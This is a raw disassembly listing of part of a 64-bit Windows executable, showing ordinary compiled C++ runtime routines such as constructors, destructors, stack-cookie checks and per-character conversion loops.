   14000169d:	49 8d 56 08          	lea    0x8(%r14),%rdx
   1400016a1:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400016a4:	0f 11 02             	movups %xmm0,(%rdx)
   1400016a7:	4c 89 45 07          	mov    %r8,0x7(%rbp)
   1400016ab:	c6 45 0f 01          	movb   $0x1,0xf(%rbp)
   1400016af:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   1400016b3:	e8 d0 86 00 00       	call   0x140009d88
   1400016b8:	48 8d 05 d9 6d 02 00 	lea    0x26dd9(%rip),%rax        # 0x140028498
   1400016bf:	49 89 06             	mov    %rax,(%r14)
   1400016c2:	48 8b 55 ff          	mov    -0x1(%rbp),%rdx
   1400016c6:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400016ca:	76 36                	jbe    0x140001702
   1400016cc:	48 8b 45 e7          	mov    -0x19(%rbp),%rax
   1400016d0:	48 ff c2             	inc    %rdx
   1400016d3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400016da:	72 1e                	jb     0x1400016fa
   1400016dc:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   1400016e0:	48 2b c1             	sub    %rcx,%rax
   1400016e3:	48 83 e8 08          	sub    $0x8,%rax
   1400016e7:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400016eb:	77 06                	ja     0x1400016f3
   1400016ed:	48 83 c2 27          	add    $0x27,%rdx
   1400016f1:	eb 0a                	jmp    0x1400016fd
   1400016f3:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400016f8:	cd 29                	int    $0x29
   1400016fa:	48 8b c8             	mov    %rax,%rcx
   1400016fd:	e8 12 6e 00 00       	call   0x140008514
   140001702:	48 8d 05 2f a4 02 00 	lea    0x2a42f(%rip),%rax        # 0x14002bb38
   140001709:	49 89 06             	mov    %rax,(%r14)
   14000170c:	41 0f 10 07          	movups (%r15),%xmm0
   140001710:	41 0f 11 46 18       	movups %xmm0,0x18(%r14)
   140001715:	49 8b c6             	mov    %r14,%rax
   140001718:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   14000171c:	48 33 cc             	xor    %rsp,%rcx
   14000171f:	e8 8c 6d 00 00       	call   0x1400084b0
   140001724:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   14000172b:	41 5f                	pop    %r15
   14000172d:	41 5e                	pop    %r14
   14000172f:	41 5c                	pop    %r12
   140001731:	5f                   	pop    %rdi
   140001732:	5e                   	pop    %rsi
   140001733:	5b                   	pop    %rbx
   140001734:	5d                   	pop    %rbp
   140001735:	c3                   	ret
   140001736:	e8 85 fc ff ff       	call   0x1400013c0
   14000173b:	cc                   	int3
   14000173c:	e8 2f fa ff ff       	call   0x140001170
   140001741:	cc                   	int3
   140001742:	cc                   	int3
   140001743:	cc                   	int3
   140001744:	cc                   	int3
   140001745:	cc                   	int3
   140001746:	cc                   	int3
   140001747:	cc                   	int3
   140001748:	cc                   	int3
   140001749:	cc                   	int3
   14000174a:	cc                   	int3
   14000174b:	cc                   	int3
   14000174c:	cc                   	int3
   14000174d:	cc                   	int3
   14000174e:	cc                   	int3
   14000174f:	cc                   	int3
   140001750:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001755:	57                   	push   %rdi
   140001756:	48 83 ec 20          	sub    $0x20,%rsp
   14000175a:	48 8d 05 c7 6c 02 00 	lea    0x26cc7(%rip),%rax        # 0x140028428
   140001761:	48 8b f9             	mov    %rcx,%rdi
   140001764:	48 89 01             	mov    %rax,(%rcx)
   140001767:	8b da                	mov    %edx,%ebx
   140001769:	48 83 c1 08          	add    $0x8,%rcx
   14000176d:	e8 9e 86 00 00       	call   0x140009e10
   140001772:	f6 c3 01             	test   $0x1,%bl
   140001775:	74 0d                	je     0x140001784
   140001777:	ba 28 00 00 00       	mov    $0x28,%edx
   14000177c:	48 8b cf             	mov    %rdi,%rcx
   14000177f:	e8 90 6d 00 00       	call   0x140008514
   140001784:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001789:	48 8b c7             	mov    %rdi,%rax
   14000178c:	48 83 c4 20          	add    $0x20,%rsp
   140001790:	5f                   	pop    %rdi
   140001791:	c3                   	ret
   140001792:	cc                   	int3
   140001793:	cc                   	int3
   140001794:	cc                   	int3
   140001795:	cc                   	int3
   140001796:	cc                   	int3
   140001797:	cc                   	int3
   140001798:	cc                   	int3
   140001799:	cc                   	int3
   14000179a:	cc                   	int3
   14000179b:	cc                   	int3
   14000179c:	cc                   	int3
   14000179d:	cc                   	int3
   14000179e:	cc                   	int3
   14000179f:	cc                   	int3
   1400017a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400017a5:	57                   	push   %rdi
   1400017a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400017aa:	48 8b da             	mov    %rdx,%rbx
   1400017ad:	48 8d 05 74 6c 02 00 	lea    0x26c74(%rip),%rax        # 0x140028428
   1400017b4:	48 89 01             	mov    %rax,(%rcx)
   1400017b7:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   1400017bb:	48 8b f9             	mov    %rcx,%rdi
   1400017be:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400017c1:	0f 11 02             	movups %xmm0,(%rdx)
   1400017c4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1400017c8:	e8 bb 85 00 00       	call   0x140009d88
   1400017cd:	48 8d 05 64 a3 02 00 	lea    0x2a364(%rip),%rax        # 0x14002bb38
   1400017d4:	48 89 07             	mov    %rax,(%rdi)
   1400017d7:	48 8d 05 72 a3 02 00 	lea    0x2a372(%rip),%rax        # 0x14002bb50
   1400017de:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   1400017e2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400017e7:	48 89 07             	mov    %rax,(%rdi)
   1400017ea:	48 8b c7             	mov    %rdi,%rax
   1400017ed:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   1400017f1:	48 83 c4 20          	add    $0x20,%rsp
   1400017f5:	5f                   	pop    %rdi
   1400017f6:	c3                   	ret
   1400017f7:	cc                   	int3
   1400017f8:	cc                   	int3
   1400017f9:	cc                   	int3
   1400017fa:	cc                   	int3
   1400017fb:	cc                   	int3
   1400017fc:	cc                   	int3
   1400017fd:	cc                   	int3
   1400017fe:	cc                   	int3
   1400017ff:	cc                   	int3
   140001800:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001805:	57                   	push   %rdi
   140001806:	48 83 ec 20          	sub    $0x20,%rsp
   14000180a:	48 8b da             	mov    %rdx,%rbx
   14000180d:	48 8d 05 14 6c 02 00 	lea    0x26c14(%rip),%rax        # 0x140028428
   140001814:	48 89 01             	mov    %rax,(%rcx)
   140001817:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   14000181b:	48 8b f9             	mov    %rcx,%rdi
   14000181e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001821:	0f 11 02             	movups %xmm0,(%rdx)
   140001824:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140001828:	e8 5b 85 00 00       	call   0x140009d88
   14000182d:	48 8d 05 04 a3 02 00 	lea    0x2a304(%rip),%rax        # 0x14002bb38
   140001834:	48 89 07             	mov    %rax,(%rdi)
   140001837:	48 8b c7             	mov    %rdi,%rax
   14000183a:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   14000183e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001843:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001847:	48 83 c4 20          	add    $0x20,%rsp
   14000184b:	5f                   	pop    %rdi
   14000184c:	c3                   	ret
   14000184d:	cc                   	int3
   14000184e:	cc                   	int3
   14000184f:	cc                   	int3
   140001850:	48 8d 05 49 2f 03 00 	lea    0x32f49(%rip),%rax        # 0x1400347a0
   140001857:	c3                   	ret
   140001858:	cc                   	int3
   140001859:	cc                   	int3
   14000185a:	cc                   	int3
   14000185b:	cc                   	int3
   14000185c:	cc                   	int3
   14000185d:	cc                   	int3
   14000185e:	cc                   	int3
   14000185f:	cc                   	int3
   140001860:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001865:	57                   	push   %rdi
   140001866:	48 83 ec 30          	sub    $0x30,%rsp
   14000186a:	33 f6                	xor    %esi,%esi
   14000186c:	48 8b fa             	mov    %rdx,%rdi
   14000186f:	41 83 f8 01          	cmp    $0x1,%r8d
   140001873:	75 31                	jne    0x1400018a6
   140001875:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001878:	41 b8 15 00 00 00    	mov    $0x15,%r8d
   14000187e:	0f 11 02             	movups %xmm0,(%rdx)
   140001881:	48 89 72 10          	mov    %rsi,0x10(%rdx)
   140001885:	48 8b cf             	mov    %rdi,%rcx
   140001888:	48 89 72 18          	mov    %rsi,0x18(%rdx)
   14000188c:	48 8d 15 85 33 03 00 	lea    0x33385(%rip),%rdx        # 0x140034c18
   140001893:	e8 88 3d 00 00       	call   0x140005620
   140001898:	48 8b c7             	mov    %rdi,%rax
   14000189b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400018a0:	48 83 c4 30          	add    $0x30,%rsp
   1400018a4:	5f                   	pop    %rdi
   1400018a5:	c3                   	ret
   1400018a6:	41 8b c8             	mov    %r8d,%ecx
   1400018a9:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400018ae:	e8 11 65 00 00       	call   0x140007dc4
   1400018b3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400018b6:	48 8b c8             	mov    %rax,%rcx
   1400018b9:	0f 11 07             	movups %xmm0,(%rdi)
   1400018bc:	48 89 77 10          	mov    %rsi,0x10(%rdi)
   1400018c0:	48 8b d8             	mov    %rax,%rbx
   1400018c3:	48 89 77 18          	mov    %rsi,0x18(%rdi)
   1400018c7:	e8 44 55 02 00       	call   0x140026e10
   1400018cc:	4c 8b c0             	mov    %rax,%r8
   1400018cf:	48 8b d3             	mov    %rbx,%rdx
   1400018d2:	48 8b cf             	mov    %rdi,%rcx
   1400018d5:	e8 46 3d 00 00       	call   0x140005620
   1400018da:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400018df:	48 8b c7             	mov    %rdi,%rax
   1400018e2:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400018e7:	48 83 c4 30          	add    $0x30,%rsp
   1400018eb:	5f                   	pop    %rdi
   1400018ec:	c3                   	ret
   1400018ed:	cc                   	int3
   1400018ee:	cc                   	int3
   1400018ef:	cc                   	int3
   1400018f0:	40 53                	rex push %rbx
   1400018f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400018f6:	48 8b d9             	mov    %rcx,%rbx
   1400018f9:	f6 c2 01             	test   $0x1,%dl
   1400018fc:	74 0a                	je     0x140001908
   1400018fe:	ba 10 00 00 00       	mov    $0x10,%edx
   140001903:	e8 0c 6c 00 00       	call   0x140008514
   140001908:	48 8b c3             	mov    %rbx,%rax
   14000190b:	48 83 c4 20          	add    $0x20,%rsp
   14000190f:	5b                   	pop    %rbx
   140001910:	c3                   	ret
   140001911:	cc                   	int3
   140001912:	cc                   	int3
   140001913:	cc                   	int3
   140001914:	cc                   	int3
   140001915:	cc                   	int3
   140001916:	cc                   	int3
   140001917:	cc                   	int3
   140001918:	cc                   	int3
   140001919:	cc                   	int3
   14000191a:	cc                   	int3
   14000191b:	cc                   	int3
   14000191c:	cc                   	int3
   14000191d:	cc                   	int3
   14000191e:	cc                   	int3
   14000191f:	cc                   	int3
   140001920:	48 8d 05 89 2e 03 00 	lea    0x32e89(%rip),%rax        # 0x1400347b0
   140001927:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000192e:	00 
   14000192f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001933:	48 8d 05 2e 7b 02 00 	lea    0x27b2e(%rip),%rax        # 0x140029468
   14000193a:	48 89 01             	mov    %rax,(%rcx)
   14000193d:	48 8b c1             	mov    %rcx,%rax
   140001940:	c3                   	ret
   140001941:	cc                   	int3
   140001942:	cc                   	int3
   140001943:	cc                   	int3
   140001944:	cc                   	int3
   140001945:	cc                   	int3
   140001946:	cc                   	int3
   140001947:	cc                   	int3
   140001948:	cc                   	int3
   140001949:	cc                   	int3
   14000194a:	cc                   	int3
   14000194b:	cc                   	int3
   14000194c:	cc                   	int3
   14000194d:	cc                   	int3
   14000194e:	cc                   	int3
   14000194f:	cc                   	int3
   140001950:	48 83 ec 48          	sub    $0x48,%rsp
   140001954:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001959:	e8 c2 ff ff ff       	call   0x140001920
   14000195e:	48 8d 15 2b 76 03 00 	lea    0x3762b(%rip),%rdx        # 0x140038f90
   140001965:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000196a:	e8 59 86 00 00       	call   0x140009fc8
   14000196f:	cc                   	int3
   140001970:	40 53                	rex push %rbx
   140001972:	48 83 ec 20          	sub    $0x20,%rsp
   140001976:	48 8b d9             	mov    %rcx,%rbx
   140001979:	48 8b c2             	mov    %rdx,%rax
   14000197c:	48 8d 0d a5 6a 02 00 	lea    0x26aa5(%rip),%rcx        # 0x140028428
   140001983:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001986:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000198a:	48 89 0b             	mov    %rcx,(%rbx)
   14000198d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001991:	0f 11 02             	movups %xmm0,(%rdx)
   140001994:	e8 ef 83 00 00       	call   0x140009d88
   140001999:	48 8d 05 c8 7a 02 00 	lea    0x27ac8(%rip),%rax        # 0x140029468
   1400019a0:	48 89 03             	mov    %rax,(%rbx)
   1400019a3:	48 8b c3             	mov    %rbx,%rax
   1400019a6:	48 83 c4 20          	add    $0x20,%rsp
   1400019aa:	5b                   	pop    %rbx
   1400019ab:	c3                   	ret
   1400019ac:	cc                   	int3
   1400019ad:	cc                   	int3
   1400019ae:	cc                   	int3
   1400019af:	cc                   	int3
   1400019b0:	40 53                	rex push %rbx
   1400019b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400019b6:	48 8d 05 f3 6a 02 00 	lea    0x26af3(%rip),%rax        # 0x1400284b0
   1400019bd:	48 8b d9             	mov    %rcx,%rbx
   1400019c0:	48 89 01             	mov    %rax,(%rcx)
   1400019c3:	f6 c2 01             	test   $0x1,%dl
   1400019c6:	74 0a                	je     0x1400019d2
   1400019c8:	ba 08 00 00 00       	mov    $0x8,%edx
   1400019cd:	e8 42 6b 00 00       	call   0x140008514
   1400019d2:	48 8b c3             	mov    %rbx,%rax
   1400019d5:	48 83 c4 20          	add    $0x20,%rsp
   1400019d9:	5b                   	pop    %rbx
   1400019da:	c3                   	ret
   1400019db:	cc                   	int3
   1400019dc:	cc                   	int3
   1400019dd:	cc                   	int3
   1400019de:	cc                   	int3
   1400019df:	cc                   	int3
   1400019e0:	f0 ff 41 08          	lock incl 0x8(%rcx)
   1400019e4:	c3                   	ret
   1400019e5:	cc                   	int3
   1400019e6:	cc                   	int3
   1400019e7:	cc                   	int3
   1400019e8:	cc                   	int3
   1400019e9:	cc                   	int3
   1400019ea:	cc                   	int3
   1400019eb:	cc                   	int3
   1400019ec:	cc                   	int3
   1400019ed:	cc                   	int3
   1400019ee:	cc                   	int3
   1400019ef:	cc                   	int3
   1400019f0:	f0 83 41 08 ff       	lock addl $0xffffffff,0x8(%rcx)
   1400019f5:	b8 00 00 00 00       	mov    $0x0,%eax
   1400019fa:	48 0f 44 c1          	cmove  %rcx,%rax
   1400019fe:	c3                   	ret
   1400019ff:	cc                   	int3
   140001a00:	48 83 ec 28          	sub    $0x28,%rsp
   140001a04:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001a08:	48 85 c9             	test   %rcx,%rcx
   140001a0b:	74 1d                	je     0x140001a2a
   140001a0d:	48 8b 01             	mov    (%rcx),%rax
   140001a10:	ff 50 10             	call   *0x10(%rax)
   140001a13:	48 85 c0             	test   %rax,%rax
   140001a16:	74 12                	je     0x140001a2a
   140001a18:	4c 8b 00             	mov    (%rax),%r8
   140001a1b:	ba 01 00 00 00       	mov    $0x1,%edx
   140001a20:	48 8b c8             	mov    %rax,%rcx
   140001a23:	48 83 c4 28          	add    $0x28,%rsp
   140001a27:	49 ff 20             	rex.WB jmp *(%r8)
   140001a2a:	48 83 c4 28          	add    $0x28,%rsp
   140001a2e:	c3                   	ret
   140001a2f:	cc                   	int3
   140001a30:	b8 01 00 00 00       	mov    $0x1,%eax
   140001a35:	c3                   	ret
   140001a36:	cc                   	int3
   140001a37:	cc                   	int3
   140001a38:	cc                   	int3
   140001a39:	cc                   	int3
   140001a3a:	cc                   	int3
   140001a3b:	cc                   	int3
   140001a3c:	cc                   	int3
   140001a3d:	cc                   	int3
   140001a3e:	cc                   	int3
   140001a3f:	cc                   	int3
   140001a40:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001a45:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001a4a:	55                   	push   %rbp
   140001a4b:	57                   	push   %rdi
   140001a4c:	41 56                	push   %r14
   140001a4e:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   140001a53:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140001a5a:	48 8b da             	mov    %rdx,%rbx
   140001a5d:	48 8b f9             	mov    %rcx,%rdi
   140001a60:	45 33 f6             	xor    %r14d,%r14d
   140001a63:	48 85 c9             	test   %rcx,%rcx
   140001a66:	0f 84 35 01 00 00    	je     0x140001ba1
   140001a6c:	4c 39 31             	cmp    %r14,(%rcx)
   140001a6f:	0f 85 2c 01 00 00    	jne    0x140001ba1
   140001a75:	b9 30 00 00 00       	mov    $0x30,%ecx
   140001a7a:	e8 51 6a 00 00       	call   0x1400084d0
   140001a7f:	48 8b f0             	mov    %rax,%rsi
   140001a82:	48 89 45 67          	mov    %rax,0x67(%rbp)
   140001a86:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001a8a:	48 85 c9             	test   %rcx,%rcx
   140001a8d:	74 0f                	je     0x140001a9e
   140001a8f:	48 8b 59 28          	mov    0x28(%rcx),%rbx
   140001a93:	48 85 db             	test   %rbx,%rbx
   140001a96:	75 0d                	jne    0x140001aa5
   140001a98:	48 8d 59 30          	lea    0x30(%rcx),%rbx
   140001a9c:	eb 07                	jmp    0x140001aa5
   140001a9e:	48 8d 1d 2b 2d 03 00 	lea    0x32d2b(%rip),%rbx        # 0x1400347d0
   140001aa5:	33 d2                	xor    %edx,%edx
   140001aa7:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001aab:	e8 d8 5c 00 00       	call   0x140007788
   140001ab0:	90                   	nop
   140001ab1:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   140001ab5:	c6 45 c7 00          	movb   $0x0,-0x39(%rbp)
   140001ab9:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   140001abd:	c6 45 d7 00          	movb   $0x0,-0x29(%rbp)
   140001ac1:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   140001ac5:	66 44 89 75 e7       	mov    %r14w,-0x19(%rbp)
   140001aca:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   140001ace:	66 44 89 75 f7       	mov    %r14w,-0x9(%rbp)
   140001ad3:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   140001ad7:	c6 45 07 00          	movb   $0x0,0x7(%rbp)
   140001adb:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   140001adf:	c6 45 17 00          	movb   $0x0,0x17(%rbp)
   140001ae3:	48 85 db             	test   %rbx,%rbx
   140001ae6:	0f 84 d2 00 00 00    	je     0x140001bbe
   140001aec:	48 8b d3             	mov    %rbx,%rdx
   140001aef:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001af3:	e8 7c 5f 00 00       	call   0x140007a74
   140001af8:	90                   	nop
   140001af9:	44 89 76 08          	mov    %r14d,0x8(%rsi)
   140001afd:	48 8d 05 7c 79 02 00 	lea    0x2797c(%rip),%rax        # 0x140029480
   140001b04:	48 89 06             	mov    %rax,(%rsi)
   140001b07:	48 8d 4d 1f          	lea    0x1f(%rbp),%rcx
   140001b0b:	e8 dc 62 00 00       	call   0x140007dec
   140001b10:	0f 10 00             	movups (%rax),%xmm0
   140001b13:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140001b17:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   140001b1b:	0f 11 4e 20          	movups %xmm1,0x20(%rsi)
   140001b1f:	48 89 37             	mov    %rsi,(%rdi)
   140001b22:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001b26:	e8 b5 5f 00 00       	call   0x140007ae0
   140001b2b:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   140001b2f:	48 85 c9             	test   %rcx,%rcx
   140001b32:	74 05                	je     0x140001b39
   140001b34:	e8 97 d7 00 00       	call   0x14000f2d0
   140001b39:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   140001b3d:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   140001b41:	48 85 c9             	test   %rcx,%rcx
   140001b44:	74 05                	je     0x140001b4b
   140001b46:	e8 85 d7 00 00       	call   0x14000f2d0
   140001b4b:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   140001b4f:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140001b53:	48 85 c9             	test   %rcx,%rcx
   140001b56:	74 05                	je     0x140001b5d
   140001b58:	e8 73 d7 00 00       	call   0x14000f2d0
   140001b5d:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   140001b61:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   140001b65:	48 85 c9             	test   %rcx,%rcx
   140001b68:	74 05                	je     0x140001b6f
   140001b6a:	e8 61 d7 00 00       	call   0x14000f2d0
   140001b6f:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   140001b73:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   140001b77:	48 85 c9             	test   %rcx,%rcx
   140001b7a:	74 05                	je     0x140001b81
   140001b7c:	e8 4f d7 00 00       	call   0x14000f2d0
   140001b81:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   140001b85:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   140001b89:	48 85 c9             	test   %rcx,%rcx
   140001b8c:	74 05                	je     0x140001b93
   140001b8e:	e8 3d d7 00 00       	call   0x14000f2d0
   140001b93:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   140001b97:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001b9b:	e8 60 5c 00 00       	call   0x140007800
   140001ba0:	90                   	nop
   140001ba1:	b8 02 00 00 00       	mov    $0x2,%eax
   140001ba6:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   140001bad:	00 
   140001bae:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140001bb2:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140001bb6:	49 8b e3             	mov    %r11,%rsp
   140001bb9:	41 5e                	pop    %r14
   140001bbb:	5f                   	pop    %rdi
   140001bbc:	5d                   	pop    %rbp
   140001bbd:	c3                   	ret
   140001bbe:	48 8d 0d fb 2b 03 00 	lea    0x32bfb(%rip),%rcx        # 0x1400347c0
   140001bc5:	e8 56 5b 00 00       	call   0x140007720
   140001bca:	cc                   	int3
   140001bcb:	cc                   	int3
   140001bcc:	cc                   	int3
   140001bcd:	cc                   	int3
   140001bce:	cc                   	int3
   140001bcf:	cc                   	int3
   140001bd0:	0f b6 c2             	movzbl %dl,%eax
   140001bd3:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140001bd7:	8b c8                	mov    %eax,%ecx
   140001bd9:	e9 d6 62 00 00       	jmp    0x140007eb4
   140001bde:	cc                   	int3
   140001bdf:	cc                   	int3
   140001be0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001be5:	56                   	push   %rsi
   140001be6:	48 83 ec 20          	sub    $0x20,%rsp
   140001bea:	49 8b f0             	mov    %r8,%rsi
   140001bed:	48 8b da             	mov    %rdx,%rbx
   140001bf0:	49 3b d0             	cmp    %r8,%rdx
   140001bf3:	74 25                	je     0x140001c1a
   140001bf5:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140001bfa:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   140001bfe:	66 90                	xchg   %ax,%ax
   140001c00:	0f b6 0b             	movzbl (%rbx),%ecx
   140001c03:	48 8b d7             	mov    %rdi,%rdx
   140001c06:	e8 a9 62 00 00       	call   0x140007eb4
   140001c0b:	88 03                	mov    %al,(%rbx)
   140001c0d:	48 ff c3             	inc    %rbx
   140001c10:	48 3b de             	cmp    %rsi,%rbx
   140001c13:	75 eb                	jne    0x140001c00
   140001c15:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140001c1a:	48 8b c3             	mov    %rbx,%rax
   140001c1d:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001c22:	48 83 c4 20          	add    $0x20,%rsp
   140001c26:	5e                   	pop    %rsi
   140001c27:	c3                   	ret
   140001c28:	cc                   	int3
   140001c29:	cc                   	int3
   140001c2a:	cc                   	int3
   140001c2b:	cc                   	int3
   140001c2c:	cc                   	int3
   140001c2d:	cc                   	int3
   140001c2e:	cc                   	int3
   140001c2f:	cc                   	int3
   140001c30:	0f b6 c2             	movzbl %dl,%eax
   140001c33:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140001c37:	8b c8                	mov    %eax,%ecx
   140001c39:	e9 a6 63 00 00       	jmp    0x140007fe4
   140001c3e:	cc                   	int3
   140001c3f:	cc                   	int3
   140001c40:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001c45:	56                   	push   %rsi
   140001c46:	48 83 ec 20          	sub    $0x20,%rsp
   140001c4a:	49 8b f0             	mov    %r8,%rsi
   140001c4d:	48 8b da             	mov    %rdx,%rbx
   140001c50:	49 3b d0             	cmp    %r8,%rdx
   140001c53:	74 25                	je     0x140001c7a
   140001c55:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140001c5a:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   140001c5e:	66 90                	xchg   %ax,%ax
   140001c60:	0f b6 0b             	movzbl (%rbx),%ecx
   140001c63:	48 8b d7             	mov    %rdi,%rdx
   140001c66:	e8 79 63 00 00       	call   0x140007fe4
   140001c6b:	88 03                	mov    %al,(%rbx)
   140001c6d:	48 ff c3             	inc    %rbx
   140001c70:	48 3b de             	cmp    %rsi,%rbx
   140001c73:	75 eb                	jne    0x140001c60
   140001c75:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140001c7a:	48 8b c3             	mov    %rbx,%rax
   140001c7d:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001c82:	48 83 c4 20          	add    $0x20,%rsp
   140001c86:	5e                   	pop    %rsi
   140001c87:	c3                   	ret
   140001c88:	cc                   	int3
   140001c89:	cc                   	int3
   140001c8a:	cc                   	int3
   140001c8b:	cc                   	int3
   140001c8c:	cc                   	int3
   140001c8d:	cc                   	int3
   140001c8e:	cc                   	int3
   140001c8f:	cc                   	int3
   140001c90:	0f b6 c2             	movzbl %dl,%eax
   140001c93:	c3                   	ret
   140001c94:	cc                   	int3
   140001c95:	cc                   	int3
   140001c96:	cc                   	int3
   140001c97:	cc                   	int3
   140001c98:	cc                   	int3
   140001c99:	cc                   	int3
   140001c9a:	cc                   	int3
   140001c9b:	cc                   	int3
   140001c9c:	cc                   	int3
   140001c9d:	cc                   	int3
   140001c9e:	cc                   	int3
   140001c9f:	cc                   	int3
   140001ca0:	40 53                	rex push %rbx
   140001ca2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ca6:	49 8b d8             	mov    %r8,%rbx
   140001ca9:	49 8b c9             	mov    %r9,%rcx
   140001cac:	4c 2b c2             	sub    %rdx,%r8
   140001caf:	e8 8c 45 02 00       	call   0x140026240
   140001cb4:	48 8b c3             	mov    %rbx,%rax
   140001cb7:	48 83 c4 20          	add    $0x20,%rsp
   140001cbb:	5b                   	pop    %rbx
   140001cbc:	c3                   	ret
   140001cbd:	cc                   	int3
   140001cbe:	cc                   	int3
   140001cbf:	cc                   	int3
   140001cc0:	40 53                	rex push %rbx
   140001cc2:	48 83 ec 20          	sub    $0x20,%rsp
   140001cc6:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001ccb:	49 8b d8             	mov    %r8,%rbx
   140001cce:	4c 2b c2             	sub    %rdx,%r8
   140001cd1:	e8 6a 45 02 00       	call   0x140026240
   140001cd6:	48 8b c3             	mov    %rbx,%rax
   140001cd9:	48 83 c4 20          	add    $0x20,%rsp
   140001cdd:	5b                   	pop    %rbx
   140001cde:	c3                   	ret
   140001cdf:	cc                   	int3
   140001ce0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001ce5:	57                   	push   %rdi
   140001ce6:	48 83 ec 20          	sub    $0x20,%rsp
   140001cea:	48 8d 05 8f 77 02 00 	lea    0x2778f(%rip),%rax        # 0x140029480
   140001cf1:	8b fa                	mov    %edx,%edi
   140001cf3:	48 89 01             	mov    %rax,(%rcx)
   140001cf6:	48 8b d9             	mov    %rcx,%rbx
   140001cf9:	8b 41 20             	mov    0x20(%rcx),%eax
   140001cfc:	85 c0                	test   %eax,%eax
   140001cfe:	7e 0b                	jle    0x140001d0b
   140001d00:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001d04:	e8 c7 d5 00 00       	call   0x14000f2d0
   140001d09:	eb 0b                	jmp    0x140001d16
   140001d0b:	79 09                	jns    0x140001d16
